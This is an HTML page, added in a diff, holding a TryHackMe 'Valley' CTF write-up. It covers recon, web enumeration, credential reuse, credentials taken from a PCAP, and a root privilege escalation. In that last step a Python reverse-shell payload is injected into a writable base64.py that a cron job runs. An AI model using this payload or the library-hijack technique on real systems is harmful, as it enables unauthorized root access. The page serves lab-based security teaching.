@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Valley • syndro</title>
+
+  <script>
+    (function() {
+      const saved = localStorage.getItem('theme');
+      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
+      else document.documentElement.classList.remove('light');
+    })();
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="././style.css">
+
+  <style>
+    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
+    .light { --accent: #1f6feb; --green: #238636; }
+
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e6edf3;
+      font-family: 'Roboto Mono', monospace;
+      min-height: 100vh;
+      padding: 40px 20px;
+      line-height: 1.8;
+      transition: background 0.5s, color 0.5s;
+    }
+    .light body { background: #f6f8fa; color: #0d1117; }
+
+    .container { max-width: 1100px; margin: 0 auto; position: relative; }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 4.8rem;
+      text-align: center;
+      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 20px 0 10px;
+      text-shadow: 0 0 30px rgba(88,166,255,0.3);
+    }
+    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }
+
+    .meta { text-align: center; opacity: 0.9; font-size: 1.15rem; margin-bottom: 26px; }
+    .meta span { color: var(--accent); font-weight: bold; }
+
+    .topbar {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      flex-wrap: wrap;
+      margin: 18px 0 45px;
+    }
+    .btn {
+      border: 1px solid rgba(88,166,255,0.35);
+      background: rgba(88,166,255,0.08);
+      color: inherit;
+      padding: 10px 14px;
+      border-radius: 12px;
+      cursor: pointer;
+      font-family: inherit;
+      transition: transform .2s ease, box-shadow .2s ease, background .2s ease;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .btn:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 10px 30px rgba(88,166,255,0.18);
+      background: rgba(88,166,255,0.14);
+    }
+
+    h2 { color: var(--accent); margin: 55px 0 18px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }
+    h3 { margin: 22px 0 12px; font-family: 'Orbitron', sans-serif; font-size: 1.3rem; opacity: 0.95; }
+
+    p { margin: 18px 0; }
+
+    pre {
+      background: #161b22 !important;
+      color: #f0f6fc !important;
+      padding: 20px;
+      border-radius: 14px;
+      overflow-x: auto;
+      border: 1px solid #30363d;
+      font-size: 1.05rem;
+      margin: 22px 0;
+      white-space: pre-wrap;
+    }
+    .light pre {
+      background: #f6f8fa !important;
+      color: #24292f !important;
+      border: 1px solid #d0d7de !important;
+    }
+
+    code {
+      background: rgba(88,166,255,0.1);
+      padding: 4px 10px;
+      border-radius: 8px;
+      color: var(--green);
+    }
+    .light code { background: rgba(30,110,254,0.15); }
+
+    .container img {
+      display: block;
+      max-width: 100%;
+      border-radius: 16px;
+      margin: 28px auto;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border: 2px solid rgba(88,166,255,0.3);
+      cursor: zoom-in !important;
+      transition: all 0.4s ease;
+      user-select: none;
+    }
+    .light .container img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
+    .container img:hover {
+      transform: scale(1.03);
+      box-shadow: 0 25px 80px rgba(88,166,255,0.6);
+    }
+
+    ul { margin: 16px 0; padding-left: 40px; }
+    li { margin: 10px 0; }
+
+    .callout {
+      border: 1px solid rgba(63,185,80,0.35);
+      background: rgba(63,185,80,0.08);
+      padding: 16px 18px;
+      border-radius: 14px;
+      margin: 22px 0;
+    }
+    .callout strong { color: var(--green); }
+
+    .toc {
+      border: 1px solid rgba(88,166,255,0.3);
+      background: rgba(88,166,255,0.08);
+      padding: 16px 18px;
+      border-radius: 14px;
+      margin: 18px 0 30px;
+    }
+    .toc a { color: inherit; text-decoration: none; border-bottom: 1px dashed rgba(88,166,255,0.45); }
+    .toc a:hover { color: var(--accent); }
+
+    /* Image Zoom Modal */
+    #imageModal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+    #imageModal.active { display: flex; }
+    #imageModal img {
+      max-width: min(1100px, 96vw);
+      max-height: 92vh;
+      border-radius: 16px;
+      border: 2px solid rgba(88,166,255,0.35);
+      box-shadow: 0 30px 90px rgba(0,0,0,0.8);
+      cursor: zoom-out;
+    }
+    .close-modal {
+      position: fixed;
+      top: 18px;
+      right: 18px;
+      font-size: 34px;
+      line-height: 34px;
+      width: 44px;
+      height: 44px;
+      display: grid;
+      place-items: center;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.14);
+      cursor: pointer;
+      user-select: none;
+    }
+    .back {
+      position: fixed;
+      top: 30px;
+      left: 30px;
+      background: var(--accent);
+      color: #000;
+      padding: 16px 42px;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+      transition: all 0.4s ease;
+      z-index: 9999;
+      font-size: 1.1rem;
+    }
+    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
+    .light .back { color: white; }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h1>Valley</h1>
+    <div class="meta">
+      CTF: <span>TryHackMe</span> • Category: <span>Linux</span> • Difficulty: <span>Easy</span>
+    </div>
+    <a href="../Tryhackme.html" class="back">Back</a>
+    <div class="topbar">
+      <button id="themeToggle" class="btn" type="button">🌓 Toggle theme</button>
+      <a class="btn" href="#recon">🔎 Recon</a>
+      <a class="btn" href="#web">🌐 Web Enum</a>
+      <a class="btn" href="#ftp">📦 FTP</a>
+      <a class="btn" href="#pcap">🦈 PCAP</a>
+      <a class="btn" href="#ssh">🔐 SSH</a>
+      <a class="btn" href="#pe">⚡ PrivEsc</a>
+    </div>
+
+    <div class="toc">
+      <p><strong>Goal</strong>: answer both questions:</p>
+      <ul>
+        <li>What is the <strong>user</strong> flag?</li>
+        <li>What is the <strong>root</strong> flag?</li>
+      </ul>
+      <p><strong>Target</strong>: <code>10.80.184.98</code></p>
+    </div>
+
+    <p>
+      This writeup follows the simplest path: start with full recon, pivot through the web app to get FTP access,
+      extract SSH creds from a PCAP, then escalate to root through a writable Python library used by a root cron job.
+    </p>
+
+    <img src="Pasted image 20260216181134.png" alt="Initial enumeration screenshot">
+
+    <!-- 1) RECON -->
+    <h2 id="recon">1) Recon (Nmap)</h2>
+    <p>
+      First step is always service discovery: identify what’s exposed and what’s worth enumerating.
+    </p>
+    <pre><code>nmap -sV -r -T4 -Pn -p- -oN nmap1.nmap 10.80.184.98 -v</code></pre>
+    <img src="Pasted image 20260216181740.png" alt="Nmap results screenshot">
+    <div class="callout">
+      <strong>Key findings:</strong>
+      <ul>
+        <li><strong>22</strong> (SSH) — likely final access later</li>
+        <li><strong>80</strong> (HTTP) — main attack surface for creds / hints</li>
+        <li><strong>37370</strong> (FTP on a non-standard port) — probably contains files we need</li>
+      </ul>
+    </div>
+
+    <!-- 2) WEB ENUM -->
+    <h2 id="web">2) Web Enumeration (FFUF)</h2>
+    <p>
+      Next, brute-force directories to discover hidden routes and developer leftovers.
+    </p>
+    <pre><code>ffuf -u http://10.80.184.98/FUZZ \
+-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+-fc 404 -s</code></pre>
+    <img src="Pasted image 20260216182149.png" alt="FFUF results screenshot">
+    <p>
+      We discover multiple routes. <code>/gallery</code> and <code>/static</code> look normal for the site,
+      while <code>/pricing</code> is interesting because it contains internal files.
+    </p>
+    <img src="Pasted image 20260216182248.png" alt="Pricing directory listing screenshot">
+    <h3>note.txt</h3>
+    <img src="Pasted image 20260216182258.png" alt="note.txt content screenshot">
+
+    <!-- 3) FTP (ANON FAIL) -->
+    <h2 id="ftp">3) FTP (Anonymous attempt)</h2>
+    <p>
+      FTP is running on port <code>37370</code>, so we try a basic login first. No luck: it requires credentials.
+    </p>
+    <pre><code>ftp 10.80.184.98 37370</code></pre>
+    <img src="Pasted image 20260216182452.png" alt="FTP anonymous attempt screenshot">
+
+    <div class="callout">
+      <strong>Pointer:</strong> when a service blocks anonymous access, the creds usually come from the web app
+      (hardcoded JS, leaked configs, backups, dev panels).
+    </div>
+
+    <!-- 4) DEEPER ENUM -->
+    <h2>4) Deeper Enumeration (static → dev)</h2>
+    <p>
+      With FTP blocked, we keep digging on the website. Eventually we find a clue inside <code>/static</code>
+      that leads to a hidden dev area.
+    </p>
+    <img src="Pasted image 20260216183127.png" alt="Further enumeration screenshot">
+    <p>We spot <strong>"00"</strong> under <code>/static/fuzz</code>:</p>
+    <img src="Pasted image 20260216183159.png" alt="Static 00 discovery screenshot">
+
+    <h2>5) Hidden Dev Login (/dev)</h2>
+    <img src="Pasted image 20260216183243.png" alt="/dev login page screenshot">
+    <p>
+      The <code>/dev</code> page is a login portal. Instead of guessing, check the page source.
+      A referenced script (<code>/dev.js</code>) contains the validation logic on the client side
+      (front-end), which means credentials can be exposed.
+    </p>
+    <img src="Pasted image 20260216183426.png" alt="dev.js screenshot">
+
+    <div class="callout">
+      <strong>Creds found in dev.js:</strong>
+      <ul>
+        <li>Username: <code>siemDev</code></li>
+        <li>Password: <code>california</code></li>
+      </ul>
+    </div>
+
+    <p>
+      After logging in, we get a note — the important hint is: <em>"Stop reusing credentials"</em>.
+      That’s a strong signal to try the same creds on other services (FTP/SSH/etc).
+    </p>
+    <img src="Pasted image 20260216183539.png" alt="Dev note screenshot">
+
+    <!-- 6) FTP WITH CREDS -->
+    <h2>6) FTP (Authenticated)</h2>
+    <p>
+      Use the dev creds on FTP. It works.
+    </p>
+    <pre><code>ftp 10.80.184.98 37370</code></pre>
+    <img src="Pasted image 20260216183656.png" alt="FTP login success screenshot">
+
+    <p>
+      Listing the directory shows <strong>three</strong> Wireshark capture files (<code>.pcapng</code>).
+      Download them locally and inspect in Wireshark.
+    </p>
+    <img src="Pasted image 20260216183833.png" alt="FTP dir listing screenshot">
+
+    <pre><code># Typical FTP workflow
+dir
+get file1.pcapng
+get file2.pcapng
+get file3.pcapng
+
+# (Optional) if allowed by the server:
+# mget *.pcapng</code></pre>
+
+    <!-- 7) PCAP -->
+    <h2 id="pcap">7) PCAP Analysis (Wireshark)</h2>
+    <p>
+      Open the captures and focus on credential-bearing traffic. Since we expect logins,
+      filtering POST requests is a quick win:
+    </p>
+    <pre><code>http.request.method == "POST"</code></pre>
+    <img src="Pasted image 20260216184147.png" alt="Wireshark credentials screenshot">
+
+    <div class="callout">
+      <strong>SSH creds recovered from PCAP:</strong>
+      <ul>
+        <li>Username: <code>valleyDev</code></li>
+        <li>Password: <code>ph0t0s1234</code></li>
+      </ul>
+    </div>
+
+    <!-- 8) SSH -->
+    <h2 id="ssh">8) SSH (User flag)</h2>
+    <p>Login with the recovered credentials:</p>
+    <pre><code>ssh valleyDev@10.80.184.98</code></pre>
+    <img src="Pasted image 20260216184409.png" alt="SSH login / user flag screenshot">
+    <p>
+      At this point, the <strong>user flag</strong> is available. Next goal: <strong>root</strong>.
+    </p>
+
+    <!-- 9) PRIVESC PART 1 -->
+    <h2 id="pe">9) Privilege Escalation (Part 1 — valleyAuthenticator)</h2>
+    <p>
+      Basic checks first:
+    </p>
+    <pre><code>sudo -l
+sudo -i</code></pre>
+
+    <p>
+      No sudo permissions, so we enumerate the filesystem manually. In <code>/home</code>, we find a binary:
+      <code>valleyAuthenticator</code>. It prompts for credentials, so we pull it locally and reverse it.
+    </p>
+
+    <h3>Transfer the binary (ncat)</h3>
+    <pre><code># On your local machine:
+nc -lp 1234 &gt; valleyAuthenticator
+
+# On the victim machine:
+nc 192.168.184.65 1234 &lt; valleyAuthenticator</code></pre>
+
+    <p>
+      The binary is packed, so unpack it with UPX, then open in Ghidra:
+    </p>
+    <pre><code>upx -d valleyAuthenticator</code></pre>
+
+    <img src="Pasted image 20260216190718.png" alt="Ghidra analysis screenshot">
+    <p>
+      In the decompiled output we find <strong>two MD5 hashes</strong> (one for username, one for password).
+      Cracking them (e.g., CrackStation) reveals:
+    </p>
+    <img src="Pasted image 20260216190852.png" alt="Cracked MD5 screenshot">
+
+    <div class="callout">
+      <strong>Cracked creds:</strong>
+      <ul>
+        <li>Username: <code>valley</code></li>
+        <li>Password: <code>liberty123</code></li>
+      </ul>
+    </div>
+
+    <p>
+      The authenticator prints “authenticated”, so the creds are valid somewhere. The obvious next try is SSH:
+    </p>
+    <pre><code>ssh valley@10.80.184.98</code></pre>
+
+    <!-- 10) PRIVESC PART 2 -->
+    <h2>10) Privilege Escalation (Part 2 — Cron + Python hijack)</h2>
+    <p>
+      As <code>valley</code>, we still don’t get sudo. So we hunt for root automation:
+      cron jobs, systemd timers, backups, scripts, writable paths.
+    </p>
+
+    <pre><code>cat /etc/crontab</code></pre>
+    <img src="Pasted image 20260216191259.png" alt="Crontab screenshot">
+
+    <p>
+      We spot a root-run Python script:
+      <code>/photos/script/photosEncrypt.py</code>
+    </p>
+    <img src="Pasted image 20260216191414.png" alt="photosEncrypt.py screenshot">
+
+    <div class="callout">
+      <strong>Pointer:</strong> If a root Python script imports a module and you can write to that module’s file,
+      you can hijack the import and execute code as root when the cron runs.
+    </div>
+
+    <p>
+      The script imports <code>base64</code>, so we locate the module on disk and check permissions:
+    </p>
+    <pre><code>locate base64.py
+ls -l /usr/lib/python3.8/base64.py</code></pre>
+    <img src="Pasted image 20260216191540.png" alt="base64.py permissions screenshot">
+
+    <p>
+      <strong>base64.py is writable</strong>. We add a reverse shell payload inside it.
+      (Make sure you have a listener ready on your box.)
+    </p>
+
+    <h3>Listener (your machine)</h3>
+    <pre><code>nc -lvnp 1234</code></pre>
+
+    <h3>Payload (insert into /usr/lib/python3.8/base64.py)</h3>
+    <pre><code>import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.184.65", 1234))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+import pty; pty.spawn("/bin/sh")</code></pre>
+
+    <p>Reference: revshell generator at https://www.revshells.com/</p>
+    <img src="Pasted image 20260216192129.png" alt="Reverse shell screenshot">
+
+    <p>
+      After the cron executes the root Python script, we receive a root shell.
+      Then we read the root flag and finish the room.
+    </p>
+    <img src="Pasted image 20260216192215.png" alt="Root flag screenshot">
+
+    <div class="callout">
+      <strong>Takeaways:</strong>
+      <ul>
+        <li>Client-side auth (JS validation) leaks secrets.</li>
+        <li>Credential reuse turns small leaks into full compromise.</li>
+        <li>PCAPs often contain plaintext credentials (especially HTTP).</li>
+        <li>Writable Python libs + root cron = instant privilege escalation.</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Image Zoom Modal -->
+  <div id="imageModal">
+    <div class="close-modal">×</div>
+    <img id="modalImage" src="" alt="Zoomed image">
+  </div>
+
+  <script type="text/javascript">
+    var sc_project=13192699;
+    var sc_invisible=1;
+    var sc_security="f34343e1";
+    var scJsHost = "https://";
+    document.write("<sc"+"ript type='text/javascript' src='" +
+      scJsHost + "statcounter.com/counter/counter.js'></"+"script>");
+  </script>
+
+  <noscript>
+    <div class="statcounter">
+      <img class="statcounter"
+           src="https://c.statcounter.com/13192699/0/f34343e1/1/"
+           alt="statcounter">
+    </div>
+  </noscript>
+
+  <script>
+    // Theme toggle
+    document.getElementById('themeToggle')?.addEventListener('click', () => {
+      document.documentElement.classList.toggle('light');
+      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
+    });
+
+    // Image zoom modal
+    const modal = document.getElementById('imageModal');
+    const modalImg = document.getElementById('modalImage');
+    const closeModalBtn = document.querySelector('#imageModal .close-modal');
+
+    document.querySelectorAll('.container img').forEach(img => {
+      img.style.cursor = 'zoom-in';
+      img.onclick = function(e) {
+        e.stopPropagation();
+        modalImg.src = this.src;
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      };
+    });
+
+    closeModalBtn.onclick = () => {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    };
+
+    modal.onclick = (e) => {
+      if (e.target === modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    };
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('active')) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    });
+  </script>
+</body>
+</html>
